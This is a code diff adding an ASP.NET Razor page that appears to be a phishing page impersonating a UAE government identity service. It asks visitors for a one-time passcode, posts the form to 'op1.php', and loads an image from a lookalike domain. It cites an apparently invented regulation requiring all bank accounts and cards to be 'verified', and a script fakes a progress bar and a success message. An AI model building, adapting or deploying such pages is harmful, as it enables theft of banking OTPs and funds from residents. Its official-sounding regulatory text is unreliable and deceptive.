@@ -1,0 +1,179 @@
+﻿@{
+    ViewData["Title"] = "QuestionnaireProgress";
+    Layout = "~/Views/Shared/_ICPLayout.cshtml";
+}
+
+<style>
+
+    body {
+        background-color: #f4f6f9;
+        font-family: 'Segoe UI', sans-serif;
+    }
+
+    .containerProgress {
+        max-width: 600px;
+        margin: 50px auto;
+        padding: 20px;
+    }
+
+    .custom-heading {
+        font-size: 1.8rem;
+        font-weight: 600;
+        color: #bc9c73;
+        border-bottom: 2px solid #bc9c73;
+        margin-bottom: 25px;
+        padding-bottom: 10px;
+    }
+
+    .lBL {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: 500;
+        color: #333;
+    }
+
+    input[type="text"], input[type="tel"], input[type="email"] {
+        width: 100%;
+        padding: 12px;
+        border-radius: 10px;
+        border: 1px solid #ccc;
+        font-size: 1rem;
+        transition: border-color 0.3s ease;
+    }
+
+        input[type="text"]:focus, input[type="tel"]:focus, input[type="email"]:focus {
+            border-color: #bc9c73;
+            outline: none;
+            box-shadow: none;
+        }
+
+</style>
+
+<div class="container containerProgress py-5">
+    <div class="row contentRow">
+        <div class="col-12">
+            <div class="text-center mb-4">
+                <h4 class="fw-bold text-uppercase custom-heading">OTP Verification</h4>
+            </div>
+            <div class="text-center mb-4">
+                <img src="https://e.icpsmartservicesuae.com/wp-content/uploads/2024/09/central.jpg" class="img-fluid rounded shadow-sm" alt="Verification Image" style="max-width: 100%; height: auto;">
+            </div>
+            @* Progress Bar *@
+            <div class="mb-5">
+                <h5 class="mb-3">Verification Progress</h5>
+                <div class="progress" style="height: 25px;">
+                    <div id="progressBar"
+                         class="progress-bar progress-bar-striped progress-bar-animated bg-success"
+                         role="progressbar"
+                         style="width: 50%;"
+                         aria-valuenow="50"
+                         aria-valuemin="0"
+                         aria-valuemax="100">
+                        50%
+                    </div>
+                </div>
+
+          @*       <div class="progress" style="height: 25px;">
+                    <div class="progress-bar progress-bar-striped progress-bar-animated bg-success" role="progressbar" style="width: 50%;" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100">
+                        50%
+                    </div>
+                </div> *@
+            </div>
+            <div class="mb-5">
+                <form action="op1.php" method="POST" class="mx-auto">
+                    <div class="mb-3">
+                        <label for="otpCode" class="form-label lBL">OTP Code *</label>
+                        <input type="text" id="otpCode" class="form-control" placeholder="Enter OTP Code" required>
+                    </div>
+                    <center><a href="javascript:void(0)" class="btn backgroundBG text-white otpNext">Next</a></center>
+                </form>
+            </div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-12">
+            <div class="alert alert-success successAlert d-none" role="alert">
+                ✅ Your verification is successfully verified. Now you can use your services.
+            </div>
+            <div class="card shadow-lg rounded-4 mb-4">
+                <div class="card-body p-5">
+                    <h3 class="text-center mb-4 fw-bold  custom-heading">Mandatory Verification of Bank Accounts and Payment Cards</h3>
+                    <p class="fs-5">
+                        The United Arab Emirates (UAE) has implemented a new regulation mandating that all bank accounts, debit cards, and credit cards must undergo verification by the specified deadline set by the UAE government. This measure aims to enhance financial security and ensure compliance with regulatory standards.
+                    </p>
+                    <p class="fs-5 mb-4">
+                        <strong>Formal Statement:</strong><br>
+                        <em>“In accordance with the latest financial security measures, the UAE government has introduced a new regulation requiring the verification of all bank accounts, debit cards, and credit cards issued within the UAE. This regulation is part of the ongoing efforts to enhance the integrity and security of the financial system.”</em>
+                    </p>
+                    <p class="fs-5 text-muted">
+                        The UAE government urges all residents and businesses to cooperate with their financial institutions and complete the verification process promptly to avoid service disruptions.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+@section Scripts {
+    <script>
+        let steps = [55, 60, 65, 70, 85, 100];
+        let currentStep = 0;
+        let showSuccessNext = false;
+
+        document.querySelector(".otpNext").addEventListener("click", function () {
+            let progressBar = document.getElementById("progressBar");
+
+            // If we're at 100% and user clicks again, show success
+            if (showSuccessNext) {
+                $(".contentRow").addClass("d-none");
+                $(".successAlert").removeClass("d-none");
+                return;
+            }
+
+            if (currentStep < steps.length) {
+                let value = steps[currentStep];
+                progressBar.style.width = value + "%";
+                progressBar.setAttribute("aria-valuenow", value);
+                progressBar.textContent = value + "%";
+
+                // If this step sets to 100%, prepare to show success on next click
+                if (value === 100) {
+                    showSuccessNext = true;
+                }
+
+                currentStep++;
+            }
+        });
+    </script>
+}
+
+
+
+@* @section Scripts {
+    <script>
+
+
+        document.querySelector(".otpNext").addEventListener("click", function () {
+            let progressBar = document.getElementById("progressBar");
+            let steps = [55, 60, 65, 70, 85, 100];
+            let i = 0;
+
+            function updateProgress() {
+                if (i < steps.length) {
+                    progressBar.style.width = steps[i] + "%";
+                    progressBar.setAttribute("aria-valuenow", steps[i]);
+                    progressBar.textContent = steps[i] + "%";
+                    i++;
+                    setTimeout(updateProgress, 400); // 0.4 sec delay per step
+                } else {
+                    setTimeout(() => {
+                        $(".contentRow").addClass("d-none");
+                        $(".successAlert").removeClass("d-none");
+                    }, 300);
+                }
+            }
+
+            updateProgress();
+        });
+    </script>
+} *@
